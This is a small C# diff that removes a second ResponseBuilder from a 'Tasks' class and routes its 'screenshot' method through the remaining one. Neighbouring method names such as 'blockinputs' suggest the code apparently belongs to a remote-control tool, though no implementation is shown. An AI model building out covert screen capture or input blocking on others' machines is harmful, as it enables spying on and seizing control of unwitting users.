@@ -16,12 +16,11 @@ namespace TasksSpace {
 
     public class Tasks {
 
-        private readonly ResponseBuilder ResponseBuilder, ResponseBuilderWithoutServerResponse;
+        private readonly ResponseBuilder ResponseBuilder;
         private readonly string tasks;
 
-        public Tasks(string tasks, ResponseBuilder responseBuilder, ResponseBuilder responseBuilderWithoutServerResponse) {
+        public Tasks(string tasks, ResponseBuilder responseBuilder) {
             this.ResponseBuilder = responseBuilder;
-            this.ResponseBuilderWithoutServerResponse = responseBuilderWithoutServerResponse;
             this.tasks = tasks;
         }
 
@@ -111,7 +110,7 @@ namespace TasksSpace {
         }
 
         private void screenshot(string s) {
-            ResponseBuilderWithoutServerResponse.screenshot();
+            ResponseBuilder.screenshot();
         }
 
         private void blockinputs(string s) {
